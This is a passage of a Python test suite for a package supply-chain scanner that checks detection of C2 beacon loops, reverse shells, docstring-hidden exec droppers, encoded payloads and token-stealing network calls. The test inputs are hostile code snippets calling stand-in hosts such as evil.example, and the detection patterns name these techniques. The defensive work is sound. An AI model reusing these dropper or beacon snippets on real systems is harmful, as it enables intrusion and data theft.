    # Past the display cap the evidence streams overflow spans into one digest instead of materializing a rendered span
    # per match, so the string stays bounded (at most cap spans plus the "(+N more)" digest) while N counts every
    # overflow match and a change to an over-cap match still reopens.
    n = sp._MAX_EVIDENCE_SPANS
    src = "\n".join(f"requests.get('http://a/p{i}')" for i in range(n + 500))
    ev = sp._extract_evidence(src, sp.RE_NETWORK)
    assert ev.count(" sha256:") == 1  # only the overflow digest, no per-span digests
    assert "(+500 more)" in ev  # every match past the cap is counted
    assert len(ev.split(" | ")) == n + 1
    sha = lambda e: re.search(r"more\) sha256:([0-9a-f]+)", e).group(1)
    chg = sp._extract_evidence(src.replace(f"a/p{n + 200}'", "a/pEVIL'"), sp.RE_NETWORK)
    assert sha(ev) != sha(chg)  # an over-cap payload change reopens


def test_extract_evidence_same_line_close_then_open_binds_call():
    # A continued statement that closes on the same physical line that opens a flagged call, e.g. `]; requests.post(`,
    # nets to <= 0 under a plain bracket count, dropping the call's `(` so the scan would stop at the opener line.
    # Order-aware counting keeps the opener, so the argument lines bind and a changed body on a continuation line
    # reopens.
    old = "x = [a]; requests.post(\n  'http://h/old',\n  data=secret,\n)\n"
    new = "x = [a]; requests.post(\n  'http://h/old',\n  data=EVIL,\n)\n"
    assert sp._evidence_hash(sp._extract_evidence(old, sp.RE_NETWORK)) != sp._evidence_hash(
        sp._extract_evidence(new, sp.RE_NETWORK)
    )


def test_extract_evidence_backslash_continued_string_binds_tail():
    # A single-quoted string can continue across lines with a trailing backslash.
    # The `)` inside that continued string on the next line must not be counted as
    # code and close the call early, or a changed argument after it would not
    # reopen. The blanker tracks the continuation so the whole call binds.
    old = "requests.post('http://h\\\n/path)', data='old')\n"
    new = "requests.post('http://h\\\n/path)', data='EVIL')\n"
    assert sp._evidence_hash(sp._extract_evidence(old, sp.RE_NETWORK)) != sp._evidence_hash(
        sp._extract_evidence(new, sp.RE_NETWORK)
    )


def test_extract_evidence_long_call_tail_past_soft_cap_reopens():
    # A call with more argument lines than the soft cap (_MAX_CALL_LINES) is still
    # followed to its real close under the hard limit, so a changed payload on a
    # continuation line well past the soft cap reopens instead of riding the first
    # _MAX_CALL_LINES lines. A bracket that never closes stays bound to the soft cap.
    mid = "\n".join(f"  opt{i}=1," for i in range(sp._MAX_CALL_LINES + 20))
    old = "requests.post(\n" + mid + "\n  data='old',\n)\n"
    new = "requests.post(\n" + mid + "\n  data='EVIL',\n)\n"
    assert sp._evidence_hash(sp._extract_evidence(old, sp.RE_NETWORK)) != sp._evidence_hash(
        sp._extract_evidence(new, sp.RE_NETWORK)
    )


def test_extract_evidence_fallback_line_numbers_are_correct():
    # The DOTALL fallback maps match offsets to line numbers via precomputed newline offsets (bisect, not a quadratic
    # content.count per match); guard that the mapping is exact so a cross-line match is recorded at its true line and a
    # changed continuation reopens.
    content = "x = 1\ny = 2\nwhile True:\n    time.sleep(60)\n    requests.get('http://a/old')\n"
    e1 = sp._extract_evidence(content, sp.RE_C2_POLLING)
    e2 = sp._extract_evidence(content.replace("/old", "/evil"), sp.RE_C2_POLLING)
    assert "L3" in e1  # the while-True loop starts on line 3, not line 1
    assert sp._evidence_hash(e1) != sp._evidence_hash(e2)


def test_large_js_bundle_pins_whole_content_when_other_finding_fires():
    # A >100 KB JS bundle that also trips the hex-var obfuscation signature binds the whole bundle, so changing payload
    # code elsewhere (obfuscation line unchanged) reopens rather than riding the matched signature line.
    obf = "var _0xabcd = function(){};\n"
    pad = "// filler\n" * 11000  # push the file over the 100 KB large-bundle bar
    fo = sp.check_js_file(obf + pad + "var payload = 'old';\n", "pkg/bundle.js", "pkg")
    fn = sp.check_js_file(obf + pad + "var payload = 'evil';\n", "pkg/bundle.js", "pkg")
    co = [f for f in fo if "hex-var obfuscation" in f.check][0]
    cn = [f for f in fn if "hex-var obfuscation" in f.check][0]
    assert "bundle-sha256:" in co.evidence
    assert sp._evidence_hash(co.evidence) != sp._evidence_hash(cn.evidence)


def test_pth_catch_all_import_evidence_is_bounded_but_reopens():
    # A large .pth made only of benign-looking imports is bounded in the evidence (prefix plus digest), not dumped in
    # full, yet still reopens when an import line changes because the digest covers every line.
    base = "".join(f"import mod{i}\n" for i in range(200))
    fo = [
        f
        for f in sp.check_pth_file(base + "import secret_old\n", "p/x.pth", "p")
        if "executable import line" in f.check
    ]
    fn = [
        f
        for f in sp.check_pth_file(base + "import secret_evil\n", "p/x.pth", "p")
        if "executable import line" in f.check
    ]
    assert fo and fn
    assert "sha256:" in fo[0].evidence and len(fo[0].evidence) < len(base)
    assert sp._evidence_hash(fo[0].evidence) != sp._evidence_hash(fn[0].evidence)


def test_extract_evidence_records_all_multiline_matches():
    # The DOTALL fallback must record every distinct cross-line match, so a second long-sleep appended below an
    # already-flagged one reopens the finding.
    one = "foo = time.sleep(\n    600\n)\n"
    two = one + "bar = time.sleep(\n    900\n)\n"
    ev1 = sp._extract_evidence(one, sp.RE_ANTI_ANALYSIS)
    ev2 = sp._extract_evidence(two, sp.RE_ANTI_ANALYSIS)
    assert ev2.count("time.sleep(") == 2  # both matches, not just the first
    assert sp._evidence_hash(ev1) != sp._evidence_hash(ev2)


def test_multiline_evidence_reopens_on_continuation_change():
    # A DOTALL match records every line it spans, so changing the URL inside an already-flagged C2 loop (a continuation
    # line) reopens the finding...
    old = "while True:\n    time.sleep(60)\n    requests.get('http://old.example/poll')\n"
    new = "while True:\n    time.sleep(60)\n    requests.get('http://evil.example/c2')\n"
    fo = _mk(
        sp.CRITICAL,
        "p",
        "p/loop.py",
        "C2 polling/beaconing loop detected",
        sp._extract_evidence(old, sp.RE_C2_POLLING),
    )
    fn = _mk(
        sp.CRITICAL,
        "p",
        "p/loop.py",
        "C2 polling/beaconing loop detected",
        sp._extract_evidence(new, sp.RE_C2_POLLING),
    )
    assert sp._finding_key(fo) != sp._finding_key(fn)
    shifted = _mk(
        sp.CRITICAL,
        "p",
        "p/loop.py",
        "C2 polling/beaconing loop detected",
        sp._extract_evidence("\n\n" + old, sp.RE_C2_POLLING),
    )
    assert sp._finding_key(fo) == sp._finding_key(shifted)


def test_extract_evidence_bounds_pathological_multiline_span():
    # A greedy DOTALL span is capped to its head line plus a digest of the rest, so evidence stays bounded while still
    # binding the full match.
    big = "vmware\n" + "x\n" * 50 + "detect\n"
    ev = sp._extract_evidence(big, sp.RE_ANTI_ANALYSIS)
    assert "sha256:" in ev and ev.count("\n") <= 1


def test_canon_evidence_keeps_duplicate_spans():
    # A second identical matched line in a new code path must change the key, so an appended duplicate payload
    # occurrence is not deduped to the same hash.
    one = "    requests.post(url, data=env)"
    base = _mk(sp.CRITICAL, "p", "p/x.py", "c", f"L2: {one}")
    dup = _mk(sp.CRITICAL, "p", "p/x.py", "c", f"L2: {one} | L5: {one}")
    assert sp._finding_key(base) != sp._finding_key(dup)


def test_canon_evidence_does_not_strip_inner_marker_from_raw_code():
    # Raw .pth evidence has no leading L<NN>: marker; an L<NN>:-looking substring inside the code must be kept, so
    # changing the code before it reopens.
    base = _mk(
        sp.HIGH,
        "p",
        "p/x.pth",
        ".pth has 1 executable import line(s)",
        "import os; note='L7: same_suffix'",
    )
    changed = _mk(
        sp.HIGH,
        "p",
        "p/x.pth",
        ".pth has 1 executable import line(s)",
        "import urllib.request; note='L7: same_suffix'",
    )
    assert sp._finding_key(base) != sp._finding_key(changed)


def test_capped_multiline_digest_is_line_shift_stable():
    # A span over the cap is digested from markerless code, so a pure line shift of the same span stays stable while a
    # code change still reopens.
    src = (
        "while True:\n"
        + "    x = 1\n" * 20
        + "    time.sleep(60)\n    requests.get('http://old.example/poll')\n"
    )
    e1 = sp._extract_evidence(src, sp.RE_C2_POLLING)
    e2 = sp._extract_evidence("\n\n" + src, sp.RE_C2_POLLING)
    assert "sha256:" in e1  # span exceeded the cap
    assert sp._evidence_hash(e1) == sp._evidence_hash(e2)
    changed = src.replace("http://old.example/poll", "http://evil.example/c2")
    assert sp._evidence_hash(e1) != sp._evidence_hash(
        sp._extract_evidence(changed, sp.RE_C2_POLLING)
    )


def test_canon_evidence_strips_punctuation_label_marker():
    # A label with punctuation (network+exec:) must still be stripped, so the line number alone does not change the key.
    a = "network+exec: L12: subprocess.run(['id'])"
    b = "network+exec: L99: subprocess.run(['id'])"
    assert sp._evidence_hash(a) == sp._evidence_hash(b)


def test_extract_evidence_binds_call_continuation_lines():
    # A multi-line network call binds its argument lines, so a changed URL on a continuation line reopens even though
    # the line with the API name is unchanged.
    old = "requests.post(\n    'http://old.example',\n    data=env,\n)\n"
    new = "requests.post(\n    'http://evil.example',\n    data=env,\n)\n"
    eo = sp._extract_evidence(old, sp.RE_NETWORK)
    en = sp._extract_evidence(new, sp.RE_NETWORK)
    assert "old.example" in eo and "evil.example" in en
    assert sp._evidence_hash(eo) != sp._evidence_hash(en)


def test_extract_evidence_records_multiline_after_oneline():
    # A one-line C2 match no longer suppresses a later multi-line C2 loop: the
    # appended cross-line construct is recorded too, so it cannot ride the key.
    oneline = "while True: time.sleep(60); requests.get('http://a/poll')\n"
    appended = oneline + "while True:\n    time.sleep(30)\n    requests.get('http://evil/c2')\n"
    eo = sp._extract_evidence(oneline, sp.RE_C2_POLLING)
    ea = sp._extract_evidence(appended, sp.RE_C2_POLLING)
    assert "evil" in ea
    assert sp._evidence_hash(eo) != sp._evidence_hash(ea)


def test_extract_evidence_giant_span_binds_full_interior():
    # A giant greedy DOTALL span bridging anchors across the whole file is bound by a digest of its full content (not
    # just the outer anchors), so a cross-line payload inserted into the bridged interior between unchanged outer
    # anchors reopens instead of riding the key. (Binding only head/tail would fail open on an interior insertion.) A
    # pure line shift still stays stable.
    gap = "\n".join(f"    x = {i}" for i in range(70))
    base = "import socket\nsock.connect(addr)\n" + gap + "\nos.dup2(fd, 0)\nsubprocess.Popen(cmd)\n"
    injected = base.replace("    x = 35", "    x = 35\n    sock.connect(evilhost)")
    ea = sp._extract_evidence(base, sp.RE_REVERSE_SHELL)
    ei = sp._extract_evidence(injected, sp.RE_REVERSE_SHELL)
    assert "sha256:" in ea  # full interior bound by a digest
    assert sp._evidence_hash(ea) != sp._evidence_hash(ei)  # interior change reopens
    shifted = sp._extract_evidence("\n\n" + base, sp.RE_REVERSE_SHELL)
    assert sp._evidence_hash(ea) == sp._evidence_hash(shifted)  # pure shift stable


def test_extract_evidence_giant_span_appended_payload_reopens():
    # The anchor binding must reopen when an appended cross-line payload extends the bridged span past the cap: an
    # existing one-line /tmp+subprocess finding plus a NEW /tmp/evil line and a later subprocess.run (60+ lines apart,
    # sharing no single line so the per-line pass never binds them) moves the span's tail anchor, so the evidence
    # changes instead of riding the unchanged key.
    existing = "import os\n/tmp/x; subprocess.run(['id'])\n"
    gap = "\n".join(f"    pad{i} = {i}" for i in range(65))
    appended = existing + "/tmp/evil\n" + gap + "\nsubprocess.run(['curl', 'evil'])\n"
    base = sp._extract_evidence(existing, sp.RE_TEMP_EXEC)
    app = sp._extract_evidence(appended, sp.RE_TEMP_EXEC)
    assert sp._evidence_hash(base) != sp._evidence_hash(app)
    shifted = sp._extract_evidence("\n\n" + appended, sp.RE_TEMP_EXEC)
    assert sp._evidence_hash(app) == sp._evidence_hash(shifted)


def test_hidden_payload_binds_visible_exec_trigger():
    # The hidden-payload finding binds the visible exec/eval line that makes the docstring runnable, so flipping a
    # harmless eval("1+1") to exec(__doc__) (which now runs the same hidden network+exec payload) reopens instead of
    # riding the key on the unchanged hidden text.
    hidden = '"""\nimport requests; requests.get("http://evil")\nsubprocess.run(["sh"])\n"""\n'
    benign = hidden + 'eval("1+1")\n'
    armed = hidden + "exec(__doc__)\n"

    def key(src):
        return [
            sp._finding_key(f)
            for f in sp._hidden_payload_findings(src, sp._strip_noncode(src), "p/x.py", "p")
            if "hidden network+exec" in f.check
        ][0]

    assert key(benign) != key(armed)


def test_js_finding_pins_full_content_digest():
    # A JS finding pins the full file content digest, so a backtick template literal
    # that closes the bracket span early cannot let later option/body lines change
    # without reopening (the Python-string-aware extractor would otherwise omit
    # them). Holds for small files too, not just large bundles.
    old = "window.ethereum.request(`tpl with ) paren`,\n  {method: 'eth', body: 'OLD'})\n"
    new = "window.ethereum.request(`tpl with ) paren`,\n  {method: 'eth', body: 'EVIL'})\n"
    fo = [f for f in sp.check_js_file(old, "p/w.js", "p") if "Web3" in f.check][0]
    fn = [f for f in sp.check_js_file(new, "p/w.js", "p") if "Web3" in f.check][0]
    assert "bundle-sha256:" in fo.evidence
    assert sp._finding_key(fo) != sp._finding_key(fn)


def test_extract_evidence_binds_moderate_appended_dotall_span():
    # A multi-line construct appended under a check that already has a one-line match is still recorded when it is not a
    # giant whole-file bridge, so its payload reopens instead of riding the old one-line match.
    one = "while True: time.sleep(60); requests.get('http://a/poll')\n"
    gap = "\n".join(f"    x = {i}" for i in range(20))
    old = one + "while True:\n" + gap + "\n    requests.get('http://old/c2')\n"
    new = one + "while True:\n" + gap + "\n    requests.get('http://evil/c2')\n"
    eo = sp._extract_evidence(old, sp.RE_C2_POLLING)
    en = sp._extract_evidence(new, sp.RE_C2_POLLING)
    assert sp._evidence_hash(eo) != sp._evidence_hash(en)


def test_canon_evidence_reorder_reopens():
    # Reordering matched lines changes executable context, so the key reopens (the canon preserves discovery order
    # rather than sorting).
    a = "Net: L10: requests.post(url)\nEnv: L20: env = os.environ.copy()"
    b = "Env: L20: env = os.environ.copy()\nNet: L10: requests.post(url)"
    assert sp._evidence_hash(a) != sp._evidence_hash(b)


def test_logical_line_end_ignores_brackets_in_strings():
    # A ) inside a string argument must not close the call early, so later argument lines still bind and a changed
    # payload there reopens.
    old = "requests.post('http://h/p)',\n    data=secret_old,\n)\n"
    new = "requests.post('http://h/p)',\n    data=secret_new,\n)\n"
    eo = sp._extract_evidence(old, sp.RE_NETWORK)
    en = sp._extract_evidence(new, sp.RE_NETWORK)
    assert "data=secret_old" in eo
    assert sp._evidence_hash(eo) != sp._evidence_hash(en)


def test_base64_exec_blob_finding_binds_every_blob():
    # The base64+exec+blob finding digests every blob, so appending a second encoded payload reopens even when the first
    # blob and decode line are unchanged.
    head = "import base64\nblob1 = '" + "A" * 220 + "'\nexec(base64.b64decode(blob1))\n"
    old = head
    new = head + "blob2 = '" + "B" * 220 + "'\n"
    fo = [f for f in sp.check_py_file(old, "p/x.py", "p") if "large encoded blob" in f.check]
    fn = [f for f in sp.check_py_file(new, "p/x.py", "p") if "large encoded blob" in f.check]
    assert fo and fn
    assert sp._finding_key(fo[0]) != sp._finding_key(fn[0])


def test_pth_large_blob_finding_binds_every_blob():
    # The .pth large-blob finding digests every blob, so appending a second encoded payload reopens rather than riding
    # the unchanged first blob.
    old = "import os\n" + "X" * 220 + "\n"
    new = old + "Y" * 220 + "\n"
    fo = [f for f in sp.check_pth_file(old, "p/x.pth", "p") if "large base64-like blob" in f.check]
    fn = [f for f in sp.check_pth_file(new, "p/x.pth", "p") if "large base64-like blob" in f.check]
    assert fo and fn
    assert sp._finding_key(fo[0]) != sp._finding_key(fn[0])


def test_pth_unusually_large_finding_is_content_bound():
    # Two different payloads of equal size and import count must get different keys: the finding now pins the .pth
    # content via a digest.
    a = [
        f
        for f in sp.check_pth_file("import abc; n=" + repr("!" * 500), "p/x.pth", "p")
        if f.check.startswith("Unusually large executable .pth")
    ]
    b = [
        f
        for f in sp.check_pth_file("import xyz; n=" + repr("?" * 500), "p/x.pth", "p")
        if f.check.startswith("Unusually large executable .pth")
    ]
    assert a and b
    assert "sha256:" in a[0].evidence
    assert sp._finding_key(a[0]) != sp._finding_key(b[0])


def test_js_token_network_finding_binds_network_evidence():
    # The JS stealer combo records both the token AND the network call, so a changed exfil endpoint reopens
    # (RE_NETWORK-recognized call used here).
    old = "const t='ghp_AAAAAAAAAAAAAAAAAAAAAAAA';\nrequests.get('http://old.example');\n"
    new = "const t='ghp_AAAAAAAAAAAAAAAAAAAAAAAA';\nrequests.get('http://evil.example');\n"
    fo = [f for f in sp.check_js_file(old, "p/p.js", "p") if "stealer" in f.check]
    fn = [f for f in sp.check_js_file(new, "p/p.js", "p") if "stealer" in f.check]
    assert fo and fn
    assert "Network:" in fo[0].evidence
    assert sp._finding_key(fo[0]) != sp._finding_key(fn[0])


def test_embedded_pem_key_body_change_reopens():
    # The embedded-key evidence pins the full PEM block via a digest, so swapping the key body under the same BEGIN/END
    # markers reopens the finding instead of riding the unchanged marker line.
    head = "-----BEGIN RSA PRIVATE KEY-----\n"
    tail = "\n-----END RSA PRIVATE KEY-----"
    net = "\nrequests.get('http://c2.example')\n"
    old = f"k = '''{head}MIIoldAAAAAAAAAAAAAAAAAAAA{tail}'''{net}"
    new = f"k = '''{head}MIInewBBBBBBBBBBBBBBBBBBBB{tail}'''{net}"
    fo = [
        f
        for f in sp.check_py_file(old, "p/k.py", "p")
        if f.check.startswith("Embedded cryptographic key + network")
    ]
    fn = [
        f
        for f in sp.check_py_file(new, "p/k.py", "p")
        if f.check.startswith("Embedded cryptographic key + network")
    ]
    assert fo and fn
    assert "sha256:" in fo[0].evidence
    assert sp._finding_key(fo[0]) != sp._finding_key(fn[0])


def test_shell_combos_bind_network_evidence():
    # Both shell combos record their network/exec side, so a changed endpoint reopens instead of riding the unchanged
    # token or hook line.
    old = "token='ghp_AAAAAAAAAAAAAAAAAAAAAAAA'\nrequests.get('http://old.example')\n"
    new = "token='ghp_AAAAAAAAAAAAAAAAAAAAAAAA'\nrequests.get('http://evil.example')\n"
    to = [
        f
        for f in sp.check_shell_file(old, "p/i.sh", "p")
        if f.check == "Shell embeds credential regexes AND makes network calls"
    ]
    tn = [
        f
        for f in sp.check_shell_file(new, "p/i.sh", "p")
        if f.check == "Shell embeds credential regexes AND makes network calls"
    ]
    assert to and tn
    assert sp._finding_key(to[0]) != sp._finding_key(tn[0])
    ho = "SessionStart hook installed\nrequests.get('http://old.example')\n"
    hn = "SessionStart hook installed\nrequests.get('http://evil.example')\n"
    go = [
        f
        for f in sp.check_shell_file(ho, "p/i.sh", "p")
        if f.check.startswith("Shell installs developer-tool")
    ]
    gn = [
        f
        for f in sp.check_shell_file(hn, "p/i.sh", "p")
        if f.check.startswith("Shell installs developer-tool")
    ]
    assert go and gn
    assert "Hook:" in go[0].evidence
    assert sp._finding_key(go[0]) != sp._finding_key(gn[0])


def test_hidden_network_exec_reopens_on_endpoint_change():
    # The hidden network+exec payload binds both the network and the exec signal, so changing the docstring exfil URL
    # reopens the finding.
    old = (
        '"""\nimport urllib.request, os\nurllib.request.urlopen("http://old/x").read()\n'
        'os.system("sh -c id")\n"""\nexec(__doc__)\n'
    )
    new = (
        '"""\nimport urllib.request, os\nurllib.request.urlopen("http://evil/x").read()\n'
        'os.system("sh -c id")\n"""\nexec(__doc__)\n'
    )
    fo = [f for f in sp.check_py_file(old, "p/d.py", "p") if "hidden network+exec" in f.check]
    fn = [f for f in sp.check_py_file(new, "p/d.py", "p") if "hidden network+exec" in f.check]
    assert fo and fn
    assert sp._finding_key(fo[0]) != sp._finding_key(fn[0])


def test_base64_exec_blob_combo_binds_blob_digest():
    # The blob may sit on a separate line from the decode call; the finding now digests it, so a changed payload reopens
    # even with unchanged base64/exec.
    b1 = "BLOB = '" + "A" * 300 + "'\nimport base64\nexec(base64.b64decode(BLOB))\n"
    b2 = "BLOB = '" + "B" * 300 + "'\nimport base64\nexec(base64.b64decode(BLOB))\n"
    f1 = [f for f in sp.check_py_file(b1, "p/m.py", "p") if "large encoded blob" in f.check]
    f2 = [f for f in sp.check_py_file(b2, "p/m.py", "p") if "large encoded blob" in f.check]
    assert f1 and f2
    assert "Blob: sha256:" in f1[0].evidence
    assert sp._finding_key(f1[0]) != sp._finding_key(f2[0])


def test_openssl_key_combo_binds_key_evidence():
    # openssl + embedded key with no network must bind the key, so a changed key reopens instead of riding the OpenSSL
    # line alone.
    o1 = 'import os\nos.system("openssl enc -aes-256-cbc -in d -out e")\nKEY = "-----BEGIN PRIVATE KEY-----A"\n'
    o2 = 'import os\nos.system("openssl enc -aes-256-cbc -in d -out e")\nKEY = "-----BEGIN PRIVATE KEY-----B"\n'
    g1 = [f for f in sp.check_py_file(o1, "p/o.py", "p") if "openssl encryption" in f.check]
    g2 = [f for f in sp.check_py_file(o2, "p/o.py", "p") if "openssl encryption" in f.check]
    assert g1 and g2
    assert "Key:" in g1[0].evidence
    assert sp._finding_key(g1[0]) != sp._finding_key(g2[0])


def test_anti_analysis_combo_binds_suspicious_side():
    # The anti-analysis combo records the network/exec side, so a changed exfil endpoint reopens instead of riding the
    # unchanged sleep/trace line.
    old = "import time, requests\ntime.sleep(600)\nrequests.get('http://old.example')\n"
    new = "import time, requests\ntime.sleep(600)\nrequests.get('http://evil.example/exfil')\n"
    fo = [
        f
        for f in sp.check_py_file(old, "p/x.py", "p")
        if f.check == "Anti-analysis/sandbox evasion + suspicious behavior"
    ]
    fn = [
        f
        for f in sp.check_py_file(new, "p/x.py", "p")
        if f.check == "Anti-analysis/sandbox evasion + suspicious behavior"
    ]
    assert fo and fn
    assert "Network:" in fo[0].evidence
    assert sp._finding_key(fo[0]) != sp._finding_key(fn[0])


def test_dns_exfil_combo_binds_other_side():
    # The DNS exfil combo records the co-occurring network side, so a changed endpoint reopens instead of riding the
    # unchanged DNS line.
    old = "import dns.resolver\ndns.resolver.resolve('x.old.com','TXT')\nrequests.get('http://old.example')\n"
    new = "import dns.resolver\ndns.resolver.resolve('x.old.com','TXT')\nrequests.get('http://evil.example/x')\n"
    fo = [
        f
        for f in sp.check_py_file(old, "p/d.py", "p")
        if f.check == "DNS exfiltration / tunneling patterns"
    ]
    fn = [
        f
        for f in sp.check_py_file(new, "p/d.py", "p")
        if f.check == "DNS exfiltration / tunneling patterns"
    ]
    assert fo and fn
    assert sp._finding_key(fo[0]) != sp._finding_key(fn[0])


def test_large_js_bundle_finding_is_content_bound():
    big_a = "var x = 1;\n" * 20000  # ~200 KB, benign
    big_b = big_a + "var exfil = 2;\n"  # different content, same size bucket
    ja = [f for f in sp.check_js_file(big_a, "pkg/bundle.js", "pkg") if "JS bundle" in f.check]
    jb = [f for f in sp.check_js_file(big_b, "pkg/bundle.js", "pkg") if "JS bundle" in f.check]
    assert ja and jb, "large JS bundle must produce a finding"
    assert ja[0].evidence.startswith("sha256:")
    assert sp._finding_key(ja[0]) != sp._finding_key(jb[0])


def test_pth_large_blob_finding_is_content_bound():
    # The .pth base64-blob evidence pins the full blob via a digest, so a payload that keeps the first 120 chars but
    # changes the tail reopens the finding.
    head = "A" * 120
    a = [
        f
        for f in sp.check_pth_file("import os\n" + head + "B" * 200, "p/x.pth", "p")
        if "base64-like blob" in f.check
    ]
    b = [
        f
        for f in sp.check_pth_file("import os\n" + head + "C" * 200, "p/x.pth", "p")
        if "base64-like blob" in f.check
    ]
    assert a and b, "large .pth blob must produce a finding"
    assert "sha256:" in a[0].evidence
    assert sp._finding_key(a[0]) != sp._finding_key(b[0])


def test_pth_import_lines_record_all_not_first_five():
    # All executable import lines are recorded, so swapping the sixth import for a malicious one (first five unchanged)
    # still reopens the catch-all finding.
    base = "".join(f"import mod{i}\n" for i in range(6))
    swapped = "".join(f"import mod{i}\n" for i in range(5)) + "import evil\n"
    fb = [f for f in sp.check_pth_file(base, "p/x.pth", "p") if "executable import line" in f.check]
    fs = [
        f for f in sp.check_pth_file(swapped, "p/x.pth", "p") if "executable import line" in f.check
    ]
    assert fb and fs
    assert sp._finding_key(fb[0]) != sp._finding_key(fs[0])


def test_load_baseline_warns_on_missing_evidence_hash(tmp_path, capsys):
    # A legacy baseline predating evidence_hash still loads (hash recomputed) but must WARN so the maintainer
    # regenerates rather than degrade silently.
    import json

    bl = tmp_path / "legacy.json"
    bl.write_text(
        json.dumps(
            {
                "version": 1,
                "entries": [
                    {
                        "package": "p",
                        "file": "p/x.py",
                        "check": "c",
                        "severity": sp.CRITICAL,
                        "evidence": "L5: while True:",
                    }
                ],
            }
        )
    )
    keys = sp._load_baseline(str(bl))
    assert keys  # still loaded
    assert "lack evidence_hash" in capsys.readouterr().err


def test_fstring_statement_is_not_blanked():
    # A bare f-string evaluates at import, so it must stay scannable.
    src = "f\"{__import__('os').system('id')}\"\n"
    assert "__import__" in sp._strip_noncode(src)
    plain = "'a docstring mentioning subprocess.Popen'\n"
    assert "subprocess" not in sp._strip_noncode(plain)


def test_exec_with_payload_hidden_in_docstring_flagged():
    blob = "A" * 400
    src = '"""' + blob + '"""\nimport os\nexec(__doc__)\n'
    findings = sp.check_py_file(src, "pkg/mod.py", "pkg")
    assert any("hidden in a docstring" in f.check for f in findings)
    src2 = '"""' + blob + '"""\nimport os\n'
    findings2 = sp.check_py_file(src2, "pkg/mod.py", "pkg")
    assert not any("hidden in a docstring" in f.check for f in findings2)


def test_hidden_network_plus_exec_payload_flagged():
    # exec(__doc__) dropper: the docstring (blanked by code-only scanning) holds BOTH a network fetch and an os/shell
    # exec. Neither is a blob, but together they are the payload, so the gate must flag the pair.
    payload = (
        "import urllib.request, os\n"
        "urllib.request.urlopen('http://x/y').read()\n"
        "os.system('sh -c id')\n"
    )
    src = '"""' + payload + '"""\nexec(__doc__)\n'
    findings = sp.check_py_file(src, "pkg/dropper.py", "pkg")
    assert any("hidden network+exec payload" in f.check for f in findings)


def test_real_code_network_and_subprocess_not_hidden_combo():
    src = (
        "import subprocess, urllib.request\n"
        "def run():\n"
        "    urllib.request.urlopen('http://x').read()\n"
        "    subprocess.Popen(['sh'])\n"
        "exec('1 + 1')\n"
    )
    findings = sp.check_py_file(src, "pkg/real.py", "pkg")
    assert not any("hidden network+exec payload" in f.check for f in findings)


def test_hidden_payload_survives_visible_decoy():
    # A benign visible network call must not mask a docstring payload: the detector inspects the removed (blanked)
    # span, not the whole stripped file.
    payload = (
        "import urllib.request, os\n"
        "urllib.request.urlopen('http://evil/x').read()\n"
        "os.system('sh -c id')\n"
    )
    src = (
        '"""' + payload + '"""\n'
        "import urllib.request\n"
        "urllib.request.urlopen('http://benign/ok')\n"  # visible decoy
        "exec(__doc__)\n"
    )
    findings = sp.check_py_file(src, "pkg/dropper.py", "pkg")
    assert any("hidden network+exec payload" in f.check for f in findings)


def test_comment_only_network_exec_not_flagged():
    # Tokens only in comments are not executable by exec(); the hidden network+exec
    # check inspects strings/docstrings (not comments), so this must stay clean.
    src = (
        "code = 'x = 1'\n"
        "exec(code)\n"
        "# urllib.request.urlopen('http://host/p').read()\n"
        "# subprocess.run(['sh', '-c', 'id'])\n"
    )
    findings = sp.check_py_file(src, "pkg/ex.py", "pkg")
    assert not any("hidden network+exec payload" in f.check for f in findings)


def test_baseline_suppresses_listed_but_not_new_check(tmp_path):
    bl = tmp_path / "bl.json"
    listed = _mk(
        sp.CRITICAL,
        "fastapi",
        "fastapi/routing.py",
        "C2 polling/beaconing loop detected",
        "L579: while True:",
    )
    sp._write_baseline(str(bl), [listed])
    baseline = sp._load_baseline(str(bl))

    # Same (package, path, check, matched code) -> suppressed.
    active, suppressed = sp._partition_baseline([listed], baseline)
    assert suppressed == [listed] and active == []

    # A NEW kind of finding in the SAME file is a different check -> still active.
    new_kind = _mk(
        sp.CRITICAL, "fastapi", "fastapi/routing.py", "Reverse shell / bind shell pattern"
    )
    active2, suppressed2 = sp._partition_baseline([new_kind], baseline)
    assert active2 == [new_kind] and suppressed2 == []

    # Same file + same check but CHANGED flagged code -> still active. A future
    # malicious payload cannot ride a previously reviewed entry's suppression.
    changed_code = _mk(
        sp.CRITICAL,
        "fastapi",
        "fastapi/routing.py",
        "C2 polling/beaconing loop detected",
        "L579: while True: requests.get('http://c2.example/beacon')",
    )
    active3, suppressed3 = sp._partition_baseline([changed_code], baseline)
    assert active3 == [changed_code] and suppressed3 == []

    # A benign line shift of the SAME code stays suppressed (no version churn).
    shifted = _mk(
        sp.CRITICAL,
        "fastapi",
        "fastapi/routing.py",
        "C2 polling/beaconing loop detected",
        "L640: while True:",
    )
    active4, suppressed4 = sp._partition_baseline([shifted], baseline)
    assert suppressed4 == [shifted] and active4 == []


def test_write_baseline_roundtrip_only_crit_high(tmp_path):
    bl = tmp_path / "bl.json"
    findings = [
        _mk(sp.CRITICAL, "p", "a.py", "c1"),
        _mk(sp.HIGH, "p", "b.py", "c2"),
        _mk(sp.MEDIUM, "p", "c.py", "c3"),  # MEDIUM excluded from baseline
    ]
    sp._write_baseline(str(bl), findings)
    keys = sp._load_baseline(str(bl))
    assert sp._finding_key(findings[0]) in keys
    assert sp._finding_key(findings[1]) in keys
    assert sp._finding_key(findings[2]) not in keys


def test_load_baseline_missing_file_is_empty():
    assert sp._load_baseline("/nonexistent/path/bl.json") == {}


def test_load_baseline_rejects_non_list_entries(tmp_path, capsys):
    # A malformed baseline whose "entries" is not a list must warn and fail closed (empty), not raise TypeError when
    # iterated.
    import json

    bl = tmp_path / "bad_entries.json"
    bl.write_text(json.dumps({"version": 1, "entries": None}), encoding = "utf-8")
    assert sp._load_baseline(str(bl)) == {}
    assert "entries is not a list" in capsys.readouterr().err


def test_committed_baseline_suppresses_known_but_not_a_new_payload():
    """End-to-end against the shipped allowlist: a reviewed benign finding stays
    suppressed, but a NEW malicious payload in the same baselined file/check is
    not (closes the supply-chain bypass where a future botocore/utils.py payload
    rode the existing CRITICAL entry)."""
    import json

    baseline_path = REPO_ROOT / "scripts" / "scan_packages_baseline.json"
    entries = json.loads(baseline_path.read_text(encoding = "utf-8"))["entries"]
    target = next(
        e
        for e in entries
        if e["package"] == "botocore"
        and e["file"] == "botocore/utils.py"
        and e["check"] == "Harvests environment variables/secrets AND makes network calls"
    )
    baseline = sp._load_baseline(str(baseline_path))

    benign = _mk(
        target["severity"], target["package"], target["file"], target["check"], target["evidence"]
    )
    active, suppressed = sp._partition_baseline([benign], baseline)
    assert suppressed == [benign] and active == []

    # A future malicious version: same file, same check, new exfil code.
